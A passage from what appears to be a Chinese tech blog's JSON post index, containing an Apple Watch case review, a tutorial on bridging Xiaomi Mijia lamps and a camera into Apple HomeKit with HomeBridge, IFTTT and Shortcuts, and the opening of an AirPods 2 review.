浸入水中超過1m。內容物除了Catalyst Apple Watch保護殼本體(裡面是模型機)並附一支小螺絲起子方便安裝．保護殼(含錶帶)本體保護殼(含錶帶)本體背面與原廠運動錶帶(L)比較(左：Catalyst/右：原廠)固定環卡榫與原廠運動錶帶(L)相比長度差不多但是開孔更密，在配戴上能調整到更適合手腕大小的長度；在固定環上有卡榫能確保激烈運動時不會脫落．安裝：我們要先將Catalyst錶殼拆解開來，再將Apple Watch機體放入後組裝回去． 首先轉開錶背螺絲2. 取下螺絲後，兩手抓著錶帶，使用姆指向外施力將錶殼本體推出．3.將所有部件拆解開來分解圖(取自 官網 )4. 將Apple Watch本體從現有運動錶帶上取下翻到背面用指甲壓上下方長方形卡榫後往左或往右推即可！5. 將Apple Watch機體放入防水套中安裝時請注意防水套要套好，不能有皺摺避免影響防水性．6.套上保護殼上殼ㄧ樣要注意不能有皺摺避免影響防水性．7.放回錶帶本體並鎖上螺絲卡回本體並鎖上螺絲（ 請注意螺絲勿鎖太緊哦！ ）測試： 充電可直接吸附：測試結果：無問題，不影響充電速度。2. 心率：左：有裝殼/右：裸機測試結果：無問題，不影響心率檢測。3. 顯示方面：Apple Watch 4 滿版螢幕無遮蔽，沒問題✅4. Digital Crown可正常使用✅5. 收音影響：無特別差異✅6. 外觀：因本人手粗，手錶本來就買最大的44公釐版本，再套上保護殼後又更顯粗獷大器了．心得：這款錶帶在防護上真正做到了360° 全面保護並加強本身的防水功能以適應更艱困的環境。錶帶一樣採用親膚材質，戴起來與原廠運動錶帶無異，但在錶帶調整的部分由於開孔較密，能調整到更適合的大小（我戴原廠錶帶會卡在往前一格太鬆往後一個太緊的尷尬狀態）還有固定環的卡榫讓我這種強迫症患者更安心了一些！整體外觀狂野粗獷，從事戶外活動、登山、攀岩、潛水時很搭風格，也正是這款錶帶能發會最大保護功效的場景！下次記得帶墨鏡，太陽超大Catalyst 家族合照 ( AirPods保護套 )Muvit Apple Watch 保護套試用的第二款是 Muvit Apple Watch 保護套，相較於Catalyst的專業保護性，這款比較簡潔、便利，適用於各種日常生活場景；雖說如此，Muvit 依然通過美國軍規MIL-STD 810G 3米摔落測試，安全保護不馬乎！開箱使用：盒子正面兩個不同顏色保護套：左-黑色 / 右-淡紫色美國軍規MIL-STD 810G 3米摔落測試、極輕2.3G盒子背面雙層結構保護、矽膠減震層、聚碳酸酯緩衝系統、保護屏幕錶框內容物保護套本體，黑色/淡紫色安裝： 安裝方面非常簡單，ㄧ樣先將Apple Watch本體從現有運動錶帶上取下翻到背面用指甲壓上下方長方形卡榫後往左或往右推即可！2. 將Apple Watch 機體 ”面朝下” 放入保護套中3. 裝回錶帶，完成！完成：黑色款淡紫色款試戴，左：黑色/右：淡紫色測試：Digital Crown：可正常使用✅，其他項目如收音、心率、顯示…等等，此款僅為邊框保護套不受影響，就不特別測試啦！心得：使用這款保護套最滿意的地方就是，我可以方便快速依照生活場景替換對應的錶帶（西裝：皮革錶帶、日常：運動錶帶）拆裝方便，保護性方面足夠應付所有日常場景（做家事、打掃、搬東西）目前日常生活都是使用這款保護套。與皮製錶帶搭配心得總結：從收到試用到撰文完間隔了超過4個月，期間經歷了搬家(Sorry…本篇圖場景凌亂)、參加鐵人兩項（10KM跑步+40KM單車）、馬來西亞潛水；這兩款保護套跟著往上山下海跑跑跳跳，目前滿版保護貼依然完美無缺！還記得我換了幾張保護貼嗎？答案是3張/3個月，平均貼不到一個月就會不知道怎麼的受傷碎邊，一張要$990阿 Orz 只能說相見恨晚，早知道有保護套這種產品就不用多花冤望錢！不論是Catalyst或是Muvit都解決了我貼保護貼一直碎邊的痛點，如果你沒貼保護貼那就更該買個保護套保護螢幕邊角，不然螢幕玻璃碎裂心會更痛選擇方面的建議是，如果你時常從事激烈運動（攀岩、潛水）、勞力工作，建議選用Catalyst，較能放心；如果只是一般上班族、偶爾運動跑跑步、喜歡依照心情換錶帶，那使用 Muvit 就足夠囉！以下整一個簡單的比較表供大家參考：選購： CATALYST FOR APPLE WATCH SERIES 4 44mm超輕薄防水保護殼 MUVIT Apple Watch Series4 (44mm) 耐衝擊保護殼閒聊：從 第一篇完整的開箱 到 使用三個月後 ，算一算手上的 Apple Watch S4 已經戴快一年了；使用上已無太大的變化，第三方APP依然很少，最常用的功能依然是Apple Pay、解鎖MAC、看通知，Apple Watch已然融入到我的日常生活之中，習慣了它的便利． by the way 讓我們一起期待 Watch OS 6 吧 :)這半年更勤於發揮Apple Watch的運動功能，記錄跑步、自行車的時間、路線、心跳，除了紀錄之外；獎章讓你運動更有目標及成就感、與朋友競賽運動量或分享成果到社群都讓運動變成是有趣的事，這樣才更容易保持！獎章,競賽,運動路線,運動狀況 本篇感謝 Men’s Game 玩物誌 提供 Apple Watch Series 4 保護殼試用。延伸閱讀[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往手錶都買了，不考慮AirPods 2耳機嗎？請看&gt;&gt; AirPods 2 開箱及上手體驗心得有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 5,253 Total Views Last Statistics Date: 2025-08-15 | 5,223 Views on Medium." }, { "title": "智慧家居初體驗 - Apple HomeKit & 小米米家", "url": "/posts/zrealm-life/%E6%99%BA%E6%85%A7%E5%AE%B6%E5%B1%85%E5%88%9D%E9%AB%94%E9%A9%97-apple-homekit-%E5%B0%8F%E7%B1%B3%E7%B1%B3%E5%AE%B6-c3150cdc85dd/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 3c, 米家, homekit", "date": "2019-07-06 01:13:47 +0800", "snippet": "智慧家居初體驗 - Apple HomeKit &amp; 小米米家米家智慧攝影機及米家智慧檯燈、Homekit設定教學[2020/04/20] 進階篇已發 ： 有經驗的朋友請直接左轉前往&gt;&gt; 示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit雜談：最近剛搬完家；有別於原本住的地方，天花板是辦公室輕鋼架燈，亮到要拔掉幾根燈管眼睛才比較舒適；現在住的地...", "content": "智慧家居初體驗 - Apple HomeKit &amp; 小米米家米家智慧攝影機及米家智慧檯燈、Homekit設定教學[2020/04/20] 進階篇已發 ： 有經驗的朋友請直接左轉前往&gt;&gt; 示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit雜談：最近剛搬完家；有別於原本住的地方，天花板是辦公室輕鋼架燈，亮到要拔掉幾根燈管眼睛才比較舒適；現在住的地方則是裝潢反射燈，使用電腦、看書亮度稍嫌不足，兩週下來眼睛覺得更容易乾澀不舒服；本想直接去IKEA採購，但考量到光色、護眼，最後比較一下CP值，於是還是選擇了小米檯燈(加上之前已有買小米智慧攝影機，都是米家系列產品)。本篇：其實我在選購時並沒有特別注意是否支援Apple HomeKit，身為一個iOS 開發者實在太失格了，因為我壓跟沒想到小米會支援．所以本篇會分別介紹 Apple HomeKit 使用 、 不支援Apple HomeKit的智慧家居怎麼使用第三方串接HomeKit？ 及 使用米家本身搭建智慧家庭的方法（搭配IFTTT）大家可以根據自己的裝置需求跳著看。採買：我一共買了兩盞檯燈，一盞(Pro)放電腦桌工作用、另一盞放床頭當閱讀燈。米家檯燈 Pro ：NT$ 1,795 支援米家、Apple HomeKit米家 LED 智慧檯燈 ：NT$ 995 僅支援米家詳細介紹可參考官網，兩盞都支援智慧控制、變色、調亮度、護眼，Pro版支援Apple HomeKit、三段角度調整；目前使用下來，以一盞燈的功能來說已經相當滿意，硬要挑一個缺點的話就是Pro版的角度調整只有底座能水平轉，燈不行，這樣就不能調整光線的角度了！理想的智慧家居目標：目前有的裝置： 米家智慧攝影機雲台版 1080P (支援：米家) 米家檯燈 Pro (支援：Apple HomeKit、米家) 米家 LED 智慧檯燈 (支援：米家)理想目標：回到家時： 自動關閉攝影機(為了隱私及防止誤觸看家警報，米家APP有BUG看家警報無法照設定時間開啟關閉)、打開電腦桌的Pro燈(不想摸黑)離家時： 自動打開攝影機(預設啟用看家)、關閉所有燈具本篇最終達成：離家、回家時發推播提醒，手機按一下觸發操作(已現有裝置沒辦法達到理想的自動化目標)智慧家居設定之路：Apple HomeKit 使用*僅限米家檯燈 Pro！米家檯燈 Pro！米家檯燈 Pro！這是最簡單的一部分，因為都是原生功能。只需四步驟 找到家庭APP（如沒有請到App Store搜尋「家庭」安裝） 打開家庭APP 點擊右上角「+」加入配近 掃描Pro檯燈底部HomeKit QRCode加入配件即可！加入配件成功後，在配件上重壓(3D TOUCH)/長壓，即可調整亮度、顏色。那不 支援Apple HomeKit的智慧家居怎麼使用第三方串接HomeKit？除了以上本身就支援的智慧裝置，那不支援Apple HomeKit的裝置是不是就完全無法透過家庭控制呢了？本章節手把手教你將不支援的裝置(攝影機、一般版檯燈)也加入到「家庭」中！ Mac ONLY，WIN使用者請直接跳到使用米家的章節 我的裝置是MacOS 10.14/iOS 12使用 HomeBridge ：HomeBridge透過使用Mac電腦作為橋接器，將不支援的裝置模擬成HomeKit設備，就可以加入到「家庭」的配件之中．運作比較可以看到一個重點就是 你要有一台Mac電腦保持開機狀態，才能保持橋接通道順暢 ；一但電腦關機、休眠，就無法控制那些HomeKit裝置。當然網路上也有神人做法，自行買一塊樹莓派來玩，將樹莓派當成橋接器；但這涉及到太多技術，本篇不會介紹。知道缺點後如果還想玩玩，可以繼續往下看或是跳到下一個直接使用米家的章節。第一步：安裝 node.js ： 點我 下載 ，安裝即可第二步：打開「終端機」輸入sudo npm -v查看node.js npm套件管理工具是否安裝成功：顯示出版本號即表示成功！第三步：透過 npm 安裝 HomeBridge套件：sudo npm -g install homebridge --unsafe-perm等待安裝完成後…HomeBridge工具就算裝完了！前面有提到 “HomeBridge就是透過使用Mac電腦作為橋接器，將不支援的裝置模擬成HomeKit設備”， 實際上HomeBridge只是一個平台，各裝置要加入要再另外找HomeBridge的外掛資源 。很好找，只要google或在github 搜尋「mija 產品英文名 homebridge」就會有許多資源；這邊介紹兩個我在用的裝置的資源：1.米家攝影機雲臺版資源： MijiaCamera攝影機是比較棘手的裝置，花了些時間研究並整理了一下；希望有幫助到有需要的人！首先ㄧ樣用「終端機」下命令安裝這MijiaCamera這個npm套件sudo npm install -g homebridge-mijia-camera安裝完成後，我們需要取得攝影機的網路 IP位址 跟 Token 兩個資訊打開米家APP → 攝影機 → 右上角「…」→設定→網路訊息，得到 IP位址 ！Token 資訊就比較麻煩了，需要你將手機連接到Mac上：打開 Itunes 介面選備份 不要勾替本機備份加密 ，點「立即備份」備份完成後， 下載 安裝備份查看軟體： iBackupViewer打開「iBackupViewer」，初次啟動會要你去 Mac「系統偏好設定」- 「安全性與隱私權」-「隱私權」-「+」- 加入「iBackupViewer」*如有隱私顧慮可關閉網路使用這套軟體、並在使用後移除再次打開「iBackupViewer」成功讀取到備份檔後，點擊右上角切換到「Tree View」模式左側會顯示你所有安裝的APP，找到米家的APP「AppDomain-com.xiaomi.mihome」-&gt;「Documents」在右側文件列表中找到並選擇 「 數字_mihome.sqlite」 這個檔案點擊右上角「Export」匯出 -&gt;「Selected」將剛剛匯出的sqlite檔案丟到 https://inloop.github.io/sqlite-viewer/ 查看內容可以看到所有米家APP上的裝置資訊欄位，向右滾動到尾端，找到 ZTOKEN 欄位，雙擊編輯全選複製最後再打開 http://aes.online-domain-tools.com/ 網站將 ZTOKEN 轉成最終 Token1.將剛剛複製出來的 ZTOKEN貼在「Input Text」，選「Hex」2.Key輸入「00000000000000000000000000000000」32個0，ㄧ樣選「Hex」3.然後按下「Decrypt!」轉換4.全選複製右下角藍匡＆去掉空格後就是我們要的結果 Token Token 這邊有嘗試用「miio」直接嗅探的方式，但好像是米家攝影機韌體有更新過，已無法用這個方法快速方便得到Token了！回到HomeBridge！編輯設定檔 config.json使用「Finder」-&gt;「前往」-&gt;「前往檔案夾」-&gt; 輸入「~/.homebridge」前往使用文字編輯器打開「config.json」，若沒有此檔案請自行建立一個或 點此下載 直接放進去{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}在config.json裡加入以上內容，IP 及 Token部分帶入上面取得的資訊。這時候再次回到「終端機」下以下命令啟動 HomeBridgesudo homebridge start如果已啟動之後又更改了config.json內容的話可以改下：sudo homebridge restart重新啟動這時會出現HomeKit QRCode 讓您掃描加入配件（步驟如上面提到的，Apple HomeKit裝置加入方式）下方也會有狀態訊息：[2019–7–4 23:45:03] [Mi Camera] connecting to camera at 192.168.0.100…[2019–7–4 23:45:03] [Mi Camera] current power state: off有出現這些＆沒出現錯誤error訊息即表示設定成功！一般常見的錯誤都是Token有錯，確認一下上面流程有無遺漏即可。現在你就可以從「家庭」APP中開關米家智慧攝影機囉！2.米家 LED 智慧檯燈 HomeBridge 資源： homebridge-yeelight-wifi再來是米家 LED 智慧檯燈，由於不像Pro版有支援Apple HomeKit，所以我們還是要用HomeBridge的方法來加入；雖然步驟 不需經過繁瑣流程取得IP、Token ，相對攝影機來說較簡單，但檯燈有檯燈的坑，要用另一個YeeLight APP配對後將區域網路控制設定打開：這點不得不吐槽一下這個糟糕的整合性，原生米家APP是無法做這項設定的；所以請到APP Store搜尋「 Yeelight 」APP 下載＆安裝開啟APP -&gt; 直接使用米家帳號登入 -&gt; 增加裝置 -&gt; 米家檯燈 -&gt; 照指示將檯燈改綁定到 Yeelight APP裝置綁定完成後回到「裝置」頁 -&gt; 點「米家檯燈」進入 -&gt; 點右下角「△」Tab -&gt; 點「局域網控制」進入設定 -&gt; 打開按鈕允許局域網(區域網路)控制檯燈的設置到這裡即可，你可以保留這個APP控制檯燈或再重新綁定回米家．再來是HomeBridge設定；ㄧ樣先打開「終端機」下命令安裝 homebridge-yeelight-wifi npm套件sudo npm install -g homebridge-yeelight-wifi安裝完成後同上攝影機的步驟，前往 ~/.homebridge 資料夾，建立或編輯修改 config.json，這次只需要在最後一個}裡面加上\"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]即可！最後結合上述攝影機的 config.json檔如下：{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\" }, \"accessories\": [ { \"accessory\": \"MijiaCamera\", \"name\": \"Mi Camera\", \"ip\": \"\", \"token\": \"\" } ], \"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]}然後一樣回到「終端機」下：sudo homebridge start或sudo homebridge restart即可看到原本不支援的米家 LED 智慧檯燈也加入HomeKit「家庭」APP囉！而且同樣支援顏色、光度調整！HomeKit配件都加好了，怎麼讓他智慧呢？全都加好、橋接好後ㄧ樣打開「家庭」APP依照步驟新增場景情境，這裡以回家為例：右上角點擊「+」-&gt; 加入情境 -&gt; 自訂 -&gt; 配件名稱自行輸入(EX:回家) -&gt; 點下方「加入配件」-&gt; 選擇已串接好的HomeKit配件 -&gt; 設定這個場景時的配件狀態(攝影機：關/臺燈：開) -&gt; 可點「測試情境」進行測試 -&gt; 右上角「完成」！這樣就設定好場囉～這時候在首頁點場景就換執行裡面所有配件的設定！還有一個快捷小撇步，就是在上拉控制選單直接點房子形狀的按鈕快速操作HomeKit/執行情境(右上可切換模式)！智慧有了，那怎麼自動化呢？智慧已經有了，現在我想要達成終極目標，回家自動關閉攝影機、開燈；離家自動開攝影機、關燈．切到第三個Tab「自動化」就可設定，很抱歉這邊沒有一個上述設備(iPad/Apple TV/HomePod)可以做 ” 家庭中樞 ” 所以這塊我就沒研究了。原理好像是回到家，感應到 ”家庭中樞” 手機/手錶即可精準觸發！這邊我有找到一個tricky的做法：(感應GPS)使用第三方的APP串接「家庭」加入自動化設定，就可以透過使用手機GPS定位來做到自動化破解封鎖使用「自動化」Tab的功能p.s GPS會有約100公尺的誤差這邊我使用的第三方串接APP是： myHome Plus下載＆安裝後開啟APP -&gt; 允許存取「家庭資料」-&gt; 會看到「家庭」的資料配置 -&gt; 點選右上角「設定按鈕」-&gt; 點「我家」進入 -&gt;下拉到「Triggers」區域 -&gt; 點「Add Trigger」Trigger 類型選「Location」-&gt; Name 輸入名字(EX:回家) -&gt; 點「Set Location」設定位置區域 -&gt; 再來 REGION STATUS 可以設定是進入還是離開該區域 -&gt; 最後 SCENES 可以選擇對應要執行的「情景」(上面建立的)按右上角「完成」儲存後，再回到「家庭」APP，可以看到「自動化」Tab 被打開可以用了！這時候就可以選擇右上角「＋」使用「家庭」APP直接新增自動化腳本！！步驟也如第三方APP，不過整合性更佳！使用原生「家庭」APP建立好自動化後也可以滑動刪除剛剛用第三方APP建的。 ！！僅需注意，至少要保留一項；否則Tab就會回到原始封鎖狀態！！Siri 語音控制的部分：相較下面介紹的米家，HomeKit的整合性相當高，可直接使用語音控制設定的配件、執行場景，無需額外，無需額外設定。HomeKit的設定介紹就到這邊了，再來講解米家原生智慧家庭的用法。使用米家本身搭建智慧家庭的方法：這邊遇到一個困惑點，就是我在米家新增設備中找不到長得一樣的米家檯燈，答案就是：看字就好，這個就是其他設備：攝影機、Pro檯燈就直接照官方說明設定加入就好，這邊不在冗述．場景情境設定：同「家庭設定方式」-&gt; 切換到「智慧」Tab -&gt; 選擇「手動執行」-&gt; 下方選擇裝置操作(由於是原生所以可選更多功能) -&gt; 繼續增加其他裝置(檯燈) -&gt; 「儲存」完成！ 一定會有人想問為什麼不直接選「離開或到達某地」？，因為這功能根本沒用，他APP沒針對台灣優化GPS是錯的，而且他的定位只能定在地標上，如果你的位置有那可以直接使用此功能， 文章後續也都可跳過！ 冷知識： Google Maps 裡的中國地圖全是錯的！快捷開關部分，可以從「我的」-&gt;「小元件」設定小工具元件！這樣就能從通知中心快速執行場境、裝置囉！也可從 Apple Watch 上控制元件！*如果手錶APP一直出現空白請刪除重裝手錶或手機APP，這個APP真的蠻多BUG的智慧有了，那怎麼自動化呢？這邊ㄧ樣要使用GPS感應方式， 如果上述新增場景用的就是「離開或到達某地」，以下介紹設定都可略過囉！* * * * *[2019/09/26] 更新 iOS ≥ 13 只使用內建 捷徑 APP 達成自動化 :iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居，點擊前往查看&gt;&gt;* * * * * iOS ≥ 12，iOS &lt; 13 Only : 使用內建的捷徑APP搭配IFTTT首先到「我的」-&gt; 「實驗室功能」-&gt;「iOS 捷徑」-&gt; 「將米家場景加入捷勁」打開系統內建的「 捷徑 」APP（若找不到請到App Stroe 搜尋下載回來）點擊右上角「+」建立捷徑 -&gt; 點右上完成下方的設定按鈕 -&gt; 名稱 -&gt; 輸入名稱（建議用英文，因為等等還要用到）回到新增捷徑頁面 -&gt; 在下方選單輸入搜尋「米家」-&gt; 加入對應的在米家設定的場景，關閉「執行時顯示」否則執行完會開啟米家APP。 *如果找不到米家請回到米家APP嘗試開關「我的」-&gt; 「實驗室功能」-&gt;「iOS 捷徑」-&gt; 「將米家場景加入捷勁」、滑掉「捷徑」APP重開。這時候又要使用第三方APP了，我們使用IFTTT做GPS進入、離開的背景觸發器，到App Store搜尋「 IFTTT 」下載＆安裝。打開IFTTT、登入帳號後，切換到「My Applets」Tab，點右上角「+」新增-&gt;點擊「+this」-&gt; 搜尋「Location」-&gt; 選擇是進入還是離開設定位置 -&gt; 點擊「Create trigger」確定 -&gt; 換點下面「+that」-&gt; 搜尋「notification」選擇「Send a rich notification from the IFTTT app」：Title = 通知標題 , Message = 通知內容Link URL 請輸入：shortcuts://run-shortcut?name= 捷徑名稱所以才說捷徑名稱盡量設英文比較好-&gt; 點選「Create action」-&gt; 可點選「Edit title」設定名稱-&gt; 「Finish」儲存完成！當你下次離開/進入設定的區域範圍就會收到觸發的通知(一樣有約100公尺的誤差範圍)，點選通知後就會自動執行米家場景囉！點選通知就會在背景自動執行場景Siri 語音控制的部分：由於米家不是Apple內建APP，所以要支援Siri語音控制就得另外設置：在「智慧」Tab -&gt; 「加入Siri」-&gt; 選擇「目標場景」按「加入Siri」-&gt; 點紅色錄製指令(EX:關燈) -&gt; 完成！即可在Siri中直接呼叫控制執行場景！總結上述一大堆的設定步驟，總結一下就是：如果要好的體驗就是得花大錢買有HomeKit標誌的電器（就可不需放台Mac做HomeBridge開機待命，直接與原生Apple 家庭功能完美結合）還有要再買HomePod或Apple TV、iPad做家庭中樞；不管是HomeKit標誌的電器、家庭中樞都不便宜！如果有技術能力可考慮使用第三方智慧裝置（如米家）搭配樹莓派做HomeBridge。如果像我一個就是個普通人那還是直接用米家最為方便上手，目前的使用習慣是回家、離開家會從通知中心點快捷小工具執行場景操作；捷徑APP搭配IFTTT的部份僅作為通知提醒，怕有時候忘記。目前體驗雖沒達到目標理想，但已經離 “智慧家庭” 更進一步了！進階篇示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit延伸閱讀 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 35,501 Total Views Last Statistics Date: 2025-08-15 | 35,488 Views on Medium." }, { "title": "AirPods 2 開箱及上手體驗心得", "url": "/posts/zrealm-life/airpods-2-%E9%96%8B%E7%AE%B1%E5%8F%8A%E4%B8%8A%E6%89%8B%E9%AB%94%E9%A9%97%E5%BF%83%E5%BE%97-33afa0ae557d/", "categories": "ZRealm Life.", "tags": "airpods, 3c, 開箱, airpods2, 生活", "date": "2019-05-01 21:32:20 +0800", "snippet": "AirPods 2 開箱及上手體驗心得 (雷射鐫刻版)更加巧妙，無比驚歎。[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往AirPods 這款產品剛出來時，我並沒有特別注意；第一眼看覺得就是個像蓮蓬頭的無線藍牙耳機，而且那時候無線藍牙耳機市場也是百家齊放的狀態，你能想到的款式、需求都能找到相符的產品再加上價格也不親民，有什麼特別的？...", "content": "AirPods 2 開箱及上手體驗心得 (雷射鐫刻版)更加巧妙，無比驚歎。[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往AirPods 這款產品剛出來時，我並沒有特別注意；第一眼看覺得就是個像蓮蓬頭的無線藍牙耳機，而且那時候無線藍牙耳機市場也是百家齊放的狀態，你能想到的款式、需求都能找到相符的產品再加上價格也不親民，有什麼特別的？直到我真正上手後才感受到它的 「驚艷」 之處，自從開賣之後 AirPods 長年霸佔藍牙耳機銷售排行榜前幾名絕非浪得虛名，靠的也不只是果粉的信仰，那到底好用在哪，讓我們繼續看下去．真香梗入手背景本來只是單純的iPhone用戶，去年入手了MacBook Pro、 Apple Watch S4 ，開始陷入蘋果生態系（俗稱：蘋果全家桶）手錶都買了，獨缺一副耳機。原本在使用的藍牙耳機已服役一段時間，就是款中規中矩的耳機，沒有不好但也沒特別出色，音質普普、續航力很夠；要說痛點的話就是通話時不清楚、訊號容易干擾，開關機要長按、要等配對及電量標示不清楚，都是小小問題；平常就通勤跟運動時使用，在電腦前多半使用喇叭或有線耳機，所以也能滿足我的基本需求．AirPods 1代推出後，身邊朋友的使用經驗多半好評，這次剛好跟上AirPods 2代的潮流，所以就順勢入手囉．p.s. 因為我沒使用過 1代 所以考量入手的點也不會是跟 1代 做比較有什麼提升的項目 (本篇文章也不會提及跟1代的差異)．挑選，無線還是有線版本？無線及有線版本價格差$1,200，起初我是考慮買無線版本的；想到我那凌亂的床頭櫃上的充電線還有出國能少帶條線，對便利性提升來說很是心動！！蘋果宣告 AirPower 胎死腹中後，我在網路尋找類似的產品，買了款 2合1的無線充電版，2 是 iPhone、Apple Watch；因iPhone跟AirPods不太會隨時或同時需要充電，所以交替使用下是能3合1使用的．一切都看似美好，直到我下標收到貨之後，實際使用發現無法同時充手機跟手錶，手錶的充電量幾乎=0、而且速度很慢，電流根本催不起來！就算使用 5.1V/2.1A 的大豆腐頭也是，不確定該搭什麼電壓的頭才能使用，查 網友評價 ，這個狀況也非個案，最後還是悻悻然的退貨了．想想也不過就兩條線(AirPods跟iPhone都是lightning/AppleWatch是專用線)，而且速度還是有線快；無線需要那塊版本+版子的線+可能要更大的頭?；比較之下沒有特別便利優勢．所以最終我選擇了有線版的AirPods 2。 p.s. 無線版跟有線版的差別只在，充電盒有線版同1代(指示燈在內)；無線版的充電盒指示燈在外&amp;也能用有線充下單從發佈到開賣(台灣)，大約隔了1個月，每天都要照三餐上官網看開賣沒，相信很多網友也是XD；實在等的揪心，其他國家早就開賣了！4/23 開賣就立馬下標了，AirPods 2 這次可以雷射鐫刻(刻字)當然不免俗的也刻了：ΛVICII ◢ ◤ — 官方預覽圖 以此紀念 瑞典傳奇音樂製作人 AVICII “One day you’ll leave this world behind So live a life you will remember.” Avicii — The Nights可以刻 11個字元 ，包含中文/英文/符號/空格；實測符號部分應該大部分都可，不支援他會顯示「無法鐫刻這些字元：」，所以不需要擔心變亂碼．p.s 有刻字約需多等一週，不刻字可到101直接買或透過經銷商購買(價格更便宜)官方給的預估收到時間是：5/3~5/10，4/29通知從上海出貨，很幸運地4/30趕在51勞動節放假前我就收到了(超快！！從上海到台北)開箱！外包裝展開本體近照本體全身照肚子裡的東西亂開箱結束！整體拿起來有份量，手感跟質感非常好，刻字部分也很精細；是蘋果產品該有的水準！使用第一次使用：全新AirPods第一次使用時只需打開 AirPods盒子 靠近 iPhone 就會詢問，即可完成配對；不用特別案配對按鈕。設定耳機操作：手機版：打開「設定」-&gt;「藍芽」-&gt;「找到你的AirPods」-&gt;「設定」MacBook 版：左上角「」-&gt;「系統偏好設定」-&gt;「藍芽」(若沒聲音請將聲音書出改選AirPods)可自行選擇左右耳的雙擊的動作．點擊位置在耳機本體上側邊小孔下方：其實我摸索了一下才知道位置一些小技巧快速切換回iPhone上使用：上拉選單-&gt;選擇音訊區塊-&gt;選擇右上圖標-&gt;切換選擇AirPods也可由此查看AirPods電量。（顯示電量較低的那隻的電量）用小工具查看電量方法：左滑到控制中心-&gt;下方「編輯」-&gt;找到「電池」新增並排序以後就能直接左滑控制中心查看AirPods電量（顯示電量較低的那隻的電量）要看左右耳及盒子的電量，就需將其中一隻AirPods放回盒子並打開盒子（因為盒子本身沒有藍芽功能）：*盒子內是我貼的防塵貼片 這裡有一個BUG，如果你的電池小工具顯示電量一下之後就消失；請去「設定」-&gt;「螢幕顯示與亮度」-&gt;「文字大小」-&gt; 調回預設大小（第三格）即可！Apple Watch 查看電量方法：上滑控制中心-&gt;點擊電量Apple Watch 上電量顯示視窗下方會多顯示AirPods的電量p.s.但好像有 BUG 有時候不會顯示關於電量的補充： 1.當 AirPod 電池電量低時，您會在其中一個或兩個 AirPods 中聽到提示音。當電池電量低時，您會聽到一次提示音，在 AirPods 關閉前，會再聽到一次提示音。 2.如果 AirPods 放在充電盒中而且盒蓋開著，指示燈顯示的是 AirPods 的充電狀態。如果 AirPods 不在充電盒中，指示燈顯示的是充電盒的狀態。綠色表示已充飽電，而琥珀色表示剩不到一次充飽電的電量。— 取自 官網的文件使用心得在寫心得之前，先提一個最近聽到的創業故事；簡而言之就是：「做產品時我們應該要做的不是針對大範圍、而是選擇一個小範圍的點，然後慢慢擴散」AirPods 與其他廠牌的藍牙耳機最大的差異就是小範圍的細節體驗無話可說，像是使用時拿掉一耳會自動暫停音樂，戴回去會恢復播放這些，還有拿出來就能直接用，不用就放回去，不用去管那些開機關機連線的問題，舒適度方面，佩戴起來甚至感覺不到他的存在．充電速度飛快，加上放在盒子內就會自動充電；所以只要稍微注意盒子還有沒有電就好(盒子約可充5次)，不太會遇到像之前要用藍牙耳機時它卻沒電，然後還要等它慢慢充電。延遲就如傳言一樣，看影片、玩遊戲幾乎感覺不到延遲(我測試玩的是極速領域賽車遊戲)．Hey Siri 的部分 ，起初也覺得很雞肋，因為我有手錶也能遠距離Hey Siri；實際體驗後同上提到的，一切都是「細節體驗」；AirPods的Hey Siri又更上了一個層級，連抬手呼出都不用；直接呼叫Hey Siri就能使用，真的達到Siri無所不在的感覺。可能遇到的場景就是在整理家務、雙手都拿東西時；這時候這個功能就相當方便！還有還有，可以 呼叫Siri調節音量 ：「Hey Siri! ，大聲一點」、「Hey Siri! ，音量調到75%」一句話來總結使用 AirPods 的心得就是： 「一切都是那麼的自然」你無需花心思在那些不必要的事物上，耳機就該只是耳機。通話品質部分 也是同樣驚艷，除了基本的通話品質穩定之外，收音效果堪比話筒品質，真的超神奇；實測跟朋友通話，他甚至聽不太出來我用的是AirPods！騎車配戴部分 ，其實我本來很期待能騎車時帶著聽導航，結果已入手1代的朋友說「不行」，3/4以上的安全帽，再帶帽子的過程會壓到耳朵，耳機很容易掉；這邊實際測試也是，心抖了一下，建議真的要邊騎車邊聽導航，只帶ㄧ耳就好，穿脫安全帽時只顧一耳比較安全。缺點：最終還是要說一下我覺得的缺點手勢可控制的項目太少…我真的很習慣手勢控制大小聲（不過還好這部分有手錶可以控制Spotify音量）另外手機連接速度的確很快但電腦的連接速度：我的MacBook Pro 2018 蠻慢的、但另一台Mac Mini跟手機連接一樣快TESTV 評測頻道也有提到它的MacBook 